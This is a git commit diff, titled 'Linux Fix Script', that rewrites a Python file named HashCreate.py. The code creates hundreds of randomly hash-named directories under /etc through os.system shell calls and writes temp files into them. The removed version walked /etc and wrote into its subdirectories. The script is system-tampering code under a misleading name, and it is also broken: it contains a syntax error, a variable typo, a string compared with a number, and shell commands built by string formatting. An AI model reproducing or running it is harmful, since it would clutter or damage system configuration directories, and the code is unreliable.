98454bea8b98343fa6912e06c8efb1b393616bc7
base-null <base-null@protonmail.com>
2020-07-21 11:28:24 -0500

    Linux Fix Script

--- HashCreate.py
+++ HashCreate.py
@@ -3,40 +3,39 @@
 
 import os,socket,hashlib,random,time
 from os import system as command
-codes = ['eradawa','nmwp','Plks','ADOiws','ADwkn','12adaw','lñkadm','aweas','ioad']
 escape = '/'
 ruta = r"/etc"
-for i in range(0,100):
-    hash = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000000000000000000000000000000000000000000000000000000000000))
-    hash = hash.encode('utf-8')
-    hash = hashlib.sha512(hash)
-    hash = hash.hexdigest()
-    hashc = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000))
-    hashc = hashc.encode('utf-8')
-    hashc = hashlib.sha512(hashc)
-    hashc = hashc.hexdigest()
+def CreateHash(i,hash,hashc,escape,ruta): #,hash,hashc,escape ARGS
+	if i == 312:
+		command("mkdir %s/%s" % (ruta, hahc + "AD"))
+		for root,directorio,archivo in os.walk(ruta):
+			if root > 131:
+				command("echo '%s' %s/%s/temp" % (hash,ruta,hashc))
+			else:
+				pass
+	else:
+		command("mkdir %s/%s" % (ruta,hashc))
+		command("echo '%s' %s/%s/temp" % (hashc,ruta,hashc,))
+if __name__ == '__main__':
+	for i in range(0,500):
+		hash = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,100000000000000000000000000000000000000000000000000000000000))
+		hash = hash.encode('utf-8')
+		hash = hashlib.sha512(hash)
+		hash = hash.hexdigest()
+		hashc =  os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,100000000000000000000000000000000000000000000000000000000000))
+		hashc = hashc.encode('utf-8')
+		hashc = hashlib.sha512(hashc)
+		hashc = hashc.hexdigest()
+		CreateHash(i,hash,hashc,escape,ruta)
 
-    if i == 80:
-        print("Vale 80")
-        command("mkdir %s" % (ruta + escape + hashc + "1Mk41j"))
-        for root,directory,archivos in os.walk(ruta):
-            if len(root) > :
-                print(root)
-                command("echo '%s' > %s/temp" % (hash,root))
-            else:
-                command("echo '%s' > %s/temp" % (hashc,root))
-        
-    else:
-        command("mkdir %s" % (ruta + escape + hashc))
-#hash = hash.encode('utf-8')
-#hash = hashlib.sha512(hash)
-#hash = str(hash.hexdigest())
-#with open('temp','w+') as f:
-#    f.write(hash+"adkj2")
-#with open('temp','r') as f:
-#    content = f.read()
-#    f.close()
-#time.sleep(5)
-#os.remove("temp")
-#print(content)
+
+	#for i in range(0,400):
+#		hash = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000000000000000000000000000000000000000000000000000000000000))
+#    	hash = hash.encode('utf-8')
+#    	hash = hashlib.sha512(hash)
+#    	hash = hash.hexdigest()
+#    	hashc = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000))
+#    	hashc = hashc.encode('utf-8')
+#    	hashc = hashlib.sha512(hashc)
+#    	hashc = hashc.hexdigest()
     
